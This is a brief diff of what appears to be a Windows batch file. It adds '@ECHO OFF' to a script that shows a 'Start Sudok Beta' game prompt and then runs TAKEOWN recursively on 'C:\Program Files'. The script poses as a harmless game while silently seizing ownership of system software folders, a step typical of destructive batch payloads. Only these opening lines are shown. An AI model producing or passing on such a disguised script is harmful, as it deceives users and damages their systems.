@@ -1,3 +1,4 @@
+@ECHO OFF
 msg *Click OK To Start Sudok Beta
 timeout 4
 TAKEOWN /F "C:\Program Files" /R /D Y
